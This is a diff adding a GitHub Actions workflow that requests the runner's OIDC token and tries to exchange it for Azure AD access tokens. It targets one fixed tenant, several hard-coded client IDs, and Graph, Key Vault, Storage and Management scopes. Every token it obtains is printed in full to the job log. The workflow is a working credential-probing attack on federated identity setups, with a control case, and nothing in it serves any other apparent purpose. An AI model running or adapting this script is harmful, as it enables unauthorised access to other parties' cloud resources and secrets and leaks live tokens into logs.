@@ -1,0 +1,29 @@
+name: azoidc3
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+  id-token: write
+jobs:
+  r:
+    runs-on: ubuntu-latest
+    timeout-minutes: 6
+    steps:
+      - name: res
+        run: |
+          set +e
+          O=$(curl -s -m 15 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange")
+          T=$(echo "$O" | python3 -c "import json,sys;print(json.load(sys.stdin).get('value',''))")
+          ex(){ CID=$1; RES=$2
+            R=$(curl -s -m 15 -X POST "https://login.microsoftonline.com/72f988bf-86f1-41af-91ab-2d7cd011db47/oauth2/v2.0/token" -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$T" -d client_id=$CID --data-urlencode "scope=$RES/.default")
+            echo "RES[$CID|$RES]=$(echo "$R" | head -c 220)"
+            echo "$R" | grep -q '"access_token"' && { echo "===GOTTOKEN $CID $RES==="; echo "$R"; }
+          }
+          for R in https://graph.microsoft.com https://vault.azure.net https://storage.azure.com https://management.core.windows.net; do
+            ex 2ac1b8af-6f93-4fa3-b65c-e629ad9c0bb6 $R
+            ex d6529b06-857c-4e9e-81d0-eee83f0320ab $R
+            ex 31f3b47b-3d31-4a5b-8f7e-1f3c8c0e7b35 $R
+          done
+          echo "--- CONTROL app without federation ---"
+          ex 5c4c9f91-aaaa-bbbb-cccc-3e9036f05d5c https://graph.microsoft.com
+          ex 19704041-8953-47f5-9b58-45c58f7fb9be https://graph.microsoft.com
